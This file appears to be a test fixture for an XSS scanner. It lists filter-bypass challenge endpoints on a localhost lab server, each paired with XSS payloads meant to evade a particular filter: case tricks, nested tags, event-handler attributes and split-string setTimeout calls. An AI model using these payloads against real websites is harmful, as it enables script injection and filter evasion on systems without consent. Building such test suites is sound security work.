@@ -1,0 +1,126 @@
+{
+  "_meta": {
+    "category": "Bypass",
+    "description": "Filter bypass challenge endpoints — each implements a different XSS filter that must be evaded",
+    "target": "http://localhost:9090"
+  },
+  "endpoints": [
+    {
+      "name": "bypass-blacklist",
+      "category": "Bypass",
+      "url": "http://localhost:9090/bypass/blacklist",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<ScRiPt>alert(1)</sCrIpT>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\"><script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "bypass-case",
+      "category": "Bypass",
+      "url": "http://localhost:9090/bypass/case",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<SCRIPT>alert(1)</SCRIPT>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<Script>alert(1)</Script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "bypass-double-encode",
+      "category": "Bypass",
+      "url": "http://localhost:9090/bypass/double-encode",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "bypass-angle-only",
+      "category": "Bypass",
+      "url": "http://localhost:9090/bypass/angle-only",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "\" autofocus onfocus=\"alert(1)", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": " onfocus=alert(1) autofocus=", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "bypass-quote-escape",
+      "category": "Bypass",
+      "url": "http://localhost:9090/bypass/quote-escape",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\" autofocus onfocus=\"alert(1)", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "bypass-recursive",
+      "category": "Bypass",
+      "url": "http://localhost:9090/bypass/recursive",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<sc<script>ript>alert(1)</sc<script>ript>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "bypass-waf-sim",
+      "category": "Bypass",
+      "url": "http://localhost:9090/bypass/waf-sim",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<input autofocus onfocus=\"setTimeout('ale'+'rt(1)')\">", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<input autofocus onfocus=\"setTimeout('con'+'firm(1)')\">", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "bypass-tag-strip",
+      "category": "Bypass",
+      "url": "http://localhost:9090/bypass/tag-strip",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "\" autofocus onfocus=\"alert(1)", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "bypass-comment",
+      "category": "Bypass",
+      "url": "http://localhost:9090/bypass/comment",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    }
+  ]
+}
